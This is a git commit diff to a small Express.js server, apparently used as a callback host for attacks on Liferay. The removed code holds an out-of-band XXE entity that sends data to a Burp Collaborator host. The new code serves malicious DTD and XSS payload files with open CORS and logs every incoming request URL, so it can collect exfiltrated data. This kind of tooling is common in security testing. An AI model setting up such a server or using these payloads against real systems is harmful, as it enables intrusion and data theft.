e23cf31c11e8f55ce9fba38d170cb0e8181ce4a2
Jasu Viding <jasu.viding@helsinki.fi>
2018-07-13 12:31:34 +0300

    liferay

--- index.js
+++ index.js
@@ -1,18 +1,37 @@
-const express = require('express')
-const app = express()
+const express = require('express');
+const app = express();
 
-var arr = []
+// PAYLOADS
+const fs = require('fs');
+const oobXXE = fs.readFileSync('./payloads/liferayDomXSS.xml').toString('utf-8');
+const liferay = fs.readFileSync('./payloads/liferayDomXSS.xml').toString('utf-8');
 
-app.get('/xxe', (req, res) => {
-	res.header('Access-Control-Allow-Origin', '*')
-	res.set('Content-Type', 'text/xml')
-	res.send('<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM \'http://koc00vwz16o0n147iaq6427vamgdc11.burpcollaborator.net\'>">')
-})
+
+var arr = [];
+
+app.get('/xxe.dtd', (req, res) => {
+	res.header('Access-Control-Allow-Origin', '*');
+	res.set('Content-Type', 'text/xml');
+	res.send(oobXXE);
+});
+
+app.get('/liferay', (req, res) => {
+	res.header('Access-Control-Allow-Origin', '*');
+	res.set('Content-Type', 'text/xml');
+	res.send(liferay);
+});
 
 app.get('*', (req, res) => {
-	const response = req.protocol + '://' + req.get('host') + req.originalUrl
-	arr.push(response)
-	res.send(arr)
-})
+	const response = req.protocol + '://' + req.get('host') + req.originalUrl;
+	arr.push(response);
+	res.send(arr);
+});
 
-app.listen(process.env.PORT || 3000, () => console.log('Example app listening on port 3000!'))
+app.options('*', (req, res, next) => {
+	res.header('Access-Control-Allow-Origin', '*');
+	res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS');
+	res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Content-Length, X-Requested-With');
+	res.send(200);
+});
+
+app.listen(process.env.PORT || 3000, () => console.log('Example app listening on port 3000!'));
